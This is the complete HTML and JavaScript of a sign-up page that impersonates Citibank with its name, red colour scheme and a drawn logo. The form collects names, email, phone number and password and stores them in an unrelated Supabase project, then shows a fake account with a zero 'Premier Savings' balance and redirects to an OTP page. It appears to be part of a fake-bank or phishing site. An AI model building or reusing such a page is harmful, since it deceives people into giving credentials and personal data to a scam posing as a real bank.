<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/>
<title>Citibank – Create Account</title>
<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;700&family=DM+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet"/>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
:root{--red:#E31837;--red-dark:#a0101f;--bg:#0a0a0a;--card:#161616;--border:rgba(255,255,255,0.08);--text:#fff;--muted:rgba(255,255,255,0.45);}
html,body{min-height:100vh;background:var(--bg);font-family:'DM Sans',sans-serif;color:var(--text);-webkit-font-smoothing:antialiased;}
.wrap{width:100%;max-width:420px;margin:0 auto;padding:40px 24px 60px;animation:fadeUp .5s ease both;}
.logo-block{text-align:center;margin-bottom:30px;}
.logo-sub{font-size:12px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-top:4px;}
.form-card{background:var(--card);border-radius:24px;padding:32px 28px;border:1px solid var(--border);box-shadow:0 24px 60px rgba(0,0,0,.5);}
.form-title{font-family:'Playfair Display',serif;font-size:24px;font-weight:700;margin-bottom:6px;}
.form-sub{font-size:14px;color:var(--muted);margin-bottom:28px;line-height:1.5;}
.row2{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
.field{margin-bottom:16px;}
.field label{display:block;margin-bottom:7px;font-size:11px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.38);}
.field input,.field select{width:100%;background:rgba(255,255,255,0.05);border:1px solid var(--border);border-radius:13px;padding:13px 16px;color:white;font-size:15px;font-family:'DM Sans',sans-serif;outline:none;transition:border .18s;}
.field input:focus,.field select:focus{border-color:rgba(227,24,55,.6);}
.field input::placeholder{color:rgba(255,255,255,.2);}
.field select option{background:#1e1e1e;}
.strength-bar{height:4px;border-radius:2px;margin-top:8px;background:rgba(255,255,255,.08);overflow:hidden;}
.strength-fill{height:100%;border-radius:2px;transition:width .3s,background .3s;width:0;}
.strength-label{font-size:11px;color:var(--muted);margin-top:4px;}
.terms{font-size:12px;color:var(--muted);margin-bottom:20px;line-height:1.6;}
.terms a{color:var(--red);text-decoration:none;}
.btn{width:100%;padding:17px;background:linear-gradient(135deg,var(--red),var(--red-dark));border:none;border-radius:16px;color:white;font-size:16px;font-weight:700;font-family:'DM Sans',sans-serif;cursor:pointer;box-shadow:0 8px 24px rgba(227,24,55,.3);transition:opacity .2s,transform .15s;}
.btn:hover{opacity:.9;transform:translateY(-1px);}
.btn:disabled{opacity:.4;cursor:not-allowed;transform:none;}
.divider{display:flex;align-items:center;gap:12px;margin:20px 0;}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:var(--border);}
.divider span{font-size:12px;color:var(--muted);}
.login-link{text-align:center;font-size:14px;color:var(--muted);}
.login-link a{color:var(--red);font-weight:700;text-decoration:none;}
@keyframes fadeUp{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:translateY(0)}}
</style>
</head>
<body>
<div class="wrap">
  <div class="logo-block">
    <svg viewBox="0 0 160 36" fill="none" width="160" height="36">
      <text y="28" font-family="'Playfair Display', serif" font-size="30" font-weight="700" fill="white">Citi</text>
      <rect x="82" y="8" width="4" height="20" rx="2" fill="#E31837"/>
      <text x="90" y="28" font-family="'DM Sans', sans-serif" font-size="20" fill="rgba(255,255,255,0.7)">bank</text>
    </svg>
    <div class="logo-sub">Open Your Account</div>
  </div>

  <div class="form-card">
    <div class="form-title">Create account</div>
    <div class="form-sub">Join thousands of Citibank customers</div>

    <div class="row2">
      <div class="field"><label>First Name</label><input type="text" id="fname" placeholder="Chibuike"/></div>
      <div class="field"><label>Last Name</label><input type="text" id="lname" placeholder="Jude"/></div>
    </div>
    <div class="field"><label>Email Address</label><input type="email" id="email" placeholder="you@example.com"/></div>
    <div class="field"><label>Phone Number</label><input type="tel" id="phone" placeholder="+234 800 000 0000"/></div>
    <div class="field">
      <label>Password</label>
      <input type="password" id="password" placeholder="••••••••" oninput="checkStrength(this.value)"/>
      <div class="strength-bar"><div class="strength-fill" id="strengthFill"></div></div>
      <div class="strength-label" id="strengthLabel"></div>
    </div>
    <div class="field"><label>Confirm Password</label><input type="password" id="confirm" placeholder="••••••••"/></div>

    <div class="terms">By creating an account, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</div>

    <button class="btn" id="signupBtn" onclick="doSignup()">Create Account</button>
    <div class="divider"><span>or</span></div>
    <div class="login-link">Already have an account? <a href="index.html">Sign in</a></div>
  </div>
</div>

<script>
const SUPABASE_URL      = 'https://rgtbqipsdebekzznswll.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_QF5lXikZj0cRv1sipEFtyg_zqjw0eW1';
const _sb = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

function showToast(msg,ok=true){
  let t=document.getElementById('_toast');
  if(!t){t=document.createElement('div');t.id='_toast';
    t.style.cssText='position:fixed;top:22px;right:18px;z-index:9999;border-radius:14px;padding:13px 18px;font-size:14px;font-weight:600;max-width:300px;box-shadow:0 8px 28px rgba(0,0,0,.5);font-family:DM Sans,sans-serif;transition:opacity .3s;';
    document.body.appendChild(t);}
  t.textContent=(ok?'✓  ':'✗  ')+msg;
  t.style.background=ok?'linear-gradient(135deg,#0f2d1a,#091c10)':'linear-gradient(135deg,#2d0f0f,#1c0808)';
  t.style.border=ok?'1px solid rgba(34,197,94,.35)':'1px solid rgba(227,24,55,.35)';
  t.style.color=ok?'#4ade80':'#f87171';t.style.opacity='1';
  clearTimeout(t._timer);t._timer=setTimeout(()=>{t.style.opacity='0';},3600);
}

function checkStrength(v){
  const fill=document.getElementById('strengthFill');
  const lbl=document.getElementById('strengthLabel');
  let score=0;
  if(v.length>=8)score++;if(/[A-Z]/.test(v))score++;if(/[0-9]/.test(v))score++;if(/[^A-Za-z0-9]/.test(v))score++;
  const map=['','#E31837','#f97316','#eab308','#22c55e'];
  const labels=['','Weak','Fair','Good','Strong'];
  fill.style.width=(score*25)+'%';fill.style.background=map[score]||'transparent';
  lbl.textContent=v.length?labels[score]||'Strong':'';lbl.style.color=map[score];
}

async function doSignup(){
  const fname=document.getElementById('fname').value.trim();
  const lname=document.getElementById('lname').value.trim();
  const email=document.getElementById('email').value.trim();
  const phone=document.getElementById('phone').value.trim();
  const pass=document.getElementById('password').value;
  const conf=document.getElementById('confirm').value;
  const btn=document.getElementById('signupBtn');

  if(!fname||!lname||!email||!phone||!pass){showToast('Please fill in all fields.',false);return;}
  if(pass.length<8){showToast('Password must be at least 8 characters.',false);return;}
  if(pass!==conf){showToast('Passwords do not match.',false);return;}

  btn.disabled=true;btn.textContent='Creating account…';

  // 1. Create auth user
  const {data:authData,error:authErr}=await _sb.auth.signUp({
    email,password:pass,
    options:{data:{full_name:fname+' '+lname,phone}}
  });
  if(authErr){showToast(authErr.message,false);btn.disabled=false;btn.textContent='Create Account';return;}

  const uid=authData.user.id;

  // 2. Insert profile row
  const {error:profErr}=await _sb.from('profiles').insert({
    id:uid,
    full_name:fname+' '+lname,
    first_name:fname,
    last_name:lname,
    email,
    phone,
    balance:0,
    account_type:'Premier Savings',
    created_at:new Date().toISOString()
  });
  if(profErr){console.warn('Profile insert:',profErr.message);}

  showToast('Account created! Check your email to verify.');
  setTimeout(()=>location.href='otp.html?mode=verify&email='+encodeURIComponent(email),1200);
}
</script>
</body>
</html>
